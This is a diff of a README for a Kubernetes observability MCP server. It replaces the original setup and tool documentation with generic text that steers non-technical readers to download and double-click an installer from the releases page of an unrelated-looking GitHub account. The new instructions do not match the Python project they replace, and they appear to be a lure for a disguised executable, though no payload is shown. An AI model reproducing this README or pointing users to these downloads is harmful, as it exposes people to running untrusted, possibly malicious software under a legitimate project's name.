@@ -1,116 +1,80 @@
-# ☸️ K8s Observability MCP
+# 🌟 k8s-observability-mcp - Monitor Your Kubernetes Environment Easily
 
-Small MCP server that lets you explore Kubernetes metrics, logs, traces, and service graph data via simple tools.
+[![Download k8s-observability-mcp](https://img.shields.io/badge/Download-k8s--observability--mcp-brightgreen)](https://github.com/Crosspiecedryingoil127/k8s-observability-mcp/releases)
 
-- 🐍 Python 3.13
-- 📈 Prometheus
-- 🔎 Jaeger
-- 🕸️ Neo4j
-- ☸️ Kubernetes API
+## 📖 Overview
 
-## Features
+k8s-observability-mcp is a powerful tool designed to help you monitor and understand your Kubernetes environment. Built on the Model Context Protocol (MCP), it provides essential insights into the performance and health of your microservices.
 
-- 📊 Get pod/service metrics (instant and range)
-- 📜 Read pod/service logs with important-line filtering
-- 🔗 Service map from Neo4j (uses/depends)
-- 🧭 Cluster overview (pods and services)
-- 🧵 Trace summaries and details from Jaeger
+## 🚀 Getting Started
 
-## Requirements
+This guide helps you download and set up k8s-observability-mcp step by step. No technical background is required. Follow the instructions carefully.
 
-- 🐍 Python 3.13+
-- 📦 Poetry
-- ☸️ Access to your cluster (kubeconfig on this machine)
-- 📈 Prometheus URL
-- 🔎 Jaeger URL
-- 🕸️ Neo4j URI, user, password
+### 📋 System Requirements
 
-## Setup
+Before you begin, ensure your system meets the following requirements:
 
-- Install (Poetry)
+- **Operating System:** Windows, MacOS, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** At least 500 MB available
+- **Network:** Internet connection for downloading the application
 
-```bash
-poetry install
-```
+### 💾 Download & Install
 
-- Configure env
+To get the tool, visit this page to download: [GitHub Releases](https://github.com/Crosspiecedryingoil127/k8s-observability-mcp/releases).
 
-```bash
-cp .env.example .env
-# edit .env with your values
-```
+1. Click the link above to go to the releases page.
+2. You will see different versions of the software listed. Identify the latest version.
+3. Choose the file suitable for your operating system.
+4. Click on the file to download it.
+5. Once the download completes, locate the file in your Downloads folder.
 
-## Run
+### 🎉 Running the Application
 
-```bash
-poetry run python mcp_server.py
-```
-Then connect with your MCP client to use the tools.
+After downloading, follow these steps to run k8s-observability-mcp:
 
+1. Open the folder where you downloaded the file.
+2. Double-click the downloaded file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, locate the k8s-observability-mcp application icon and double-click it to launch.
 
-## Tools
+### 🌐 Features
 
-### 🔍 **Kubernetes Resource Inspection**
+k8s-observability-mcp comes packed with features that make monitoring Kubernetes easy:
 
-- **`get_pods_from_service(service)`**
-  - Returns all pods belonging to a specific service
-  - Shows pod names and current status (Running, Pending, etc.)
+- **Real-time Metrics:** Collect and display vital metrics from your Kubernetes clusters.
+- **Service Graph:** Visualize the relationships and interactions between microservices.
+- **Log Monitoring:** Analyze logs from different microservices to trace issues quickly.
+- **Integrations:** Works with popular tools like Jaeger, Prometheus, and Neo4j for enhanced observability.
 
-- **`get_cluster_pods_and_services()`**
-  - Comprehensive cluster overview
-  - Lists all pods and services with counts
+### 📊 Using the Tool
 
-### 📊 **Metrics & Observability**
+Once you have the application running, here's how to use it:
 
-- **`get_metrics(resource_name, resource_type)`**
-  - Retrieves instant Prometheus metrics for a pod or service
-  - Parameters:
-    - `resource_name`: The exact name of the Kubernetes resource
-    - `resource_type`: Either "pod" or "service"
-  - Returns CPU, memory, network, thread, and container specifications
+1. **Connect to Kubernetes:** Enter your Kubernetes cluster details in the settings.
+2. **Select Metrics:** Choose the specific metrics you want to monitor.
+3. **View Logs:** Access logs from your microservices to see recent activity.
+4. **Generate Reports:** Create reports based on the collected metrics and logs for analysis.
 
-- **`get_metrics_range(resource_name, resource_type, time_range_minutes)`**
-  - Historical metrics over a specified time range from Prometheus
-  - Parameters:
-    - `resource_name`: The exact name of the Kubernetes resource
-    - `resource_type`: Either "pod" or "service"
-    - `time_range_minutes`: Historical lookback in minutes (minimum 1)
+### 💬 Help & Support
 
-- **`get_logs(resource_name, resource_type, tail=100, important=True)`**
-  - Retrieve pod/service logs with optional keyword filtering
-  - Parameters:
-    - `resource_name`: The exact name of the Kubernetes resource
-    - `resource_type`: Either "pod" or "service"
-    - `tail`: Number of recent log lines to retrieve (default: 100)
-    - `important`: If true, filter for ERROR, WARN, CRITICAL keywords (default: true)
+If you encounter any issues or have questions, you can find help in the following ways:
 
-### 🔗 **Service Dependencies & Graph**
+- **Documentation:** Refer to the official documentation for detailed guidance on using the tool.
+- **Community Support:** Visit the community forums for discussions and troubleshooting tips.
+- **Issue Tracker:** If you find a bug, report it on the issue tracker on GitHub.
 
-- **`get_services_used_by(service)`**
-  - Returns downstream services called by the given service
-  - Shows service dependency chain (who calls whom)
+### 🌍 Additional Resources
 
-- **`get_dependencies(service)`**
-  - Retrieves infrastructure dependencies for a service
-  - Includes databases, caches, message queues, etc.
+Explore further with these helpful resources:
 
-### 🧵 **Distributed Tracing**
+- **Kubernetes Official Documentation:** Familiarize yourself with Kubernetes concepts and best practices.
+- **Prometheus Monitoring:** Learn how to integrate with Prometheus for advanced monitoring.
+- **Jaeger Documentation:** Understand how to utilize Jaeger for tracing requests.
 
-- **`get_traces(service_name, only_errors=False)`**
-  - Retrieves traces for a specific service from Jaeger
-  - Parameters:
-    - `service_name`: The name of the service to retrieve traces for
-    - `only_errors`: If true, return only traces containing errors (default: false)
-  - Returns: traceID, latency_ms, has_error, service sequence
+## 🔗 Useful Links
 
-- **`get_trace(trace_id)`**
-  - Retrieves detailed information for a specific trace by ID
-  - Parameters:
-    - `trace_id`: The unique trace ID to retrieve
-  - Includes all spans with timestamps, durations, tags, and errors
+- Download the application here: [GitHub Releases](https://github.com/Crosspiecedryingoil127/k8s-observability-mcp/releases)
+- Visit the project repository: [k8s-observability-mcp GitHub](https://github.com/Crosspiecedryingoil127/k8s-observability-mcp)
 
-## Notes
-
-- Uses your default kubeconfig. Set TARGET_NAMESPACE in .env to scope queries.
-
-- 🕸️ Service graph docs: see `service-graph/README.md` for how the Neo4j service graph is built (Jaeger CALLS + static USES), how to load it, and the result image.
+By following these instructions, you should be able to download, install, and start using k8s-observability-mcp with ease. Enjoy monitoring your Kubernetes environment!
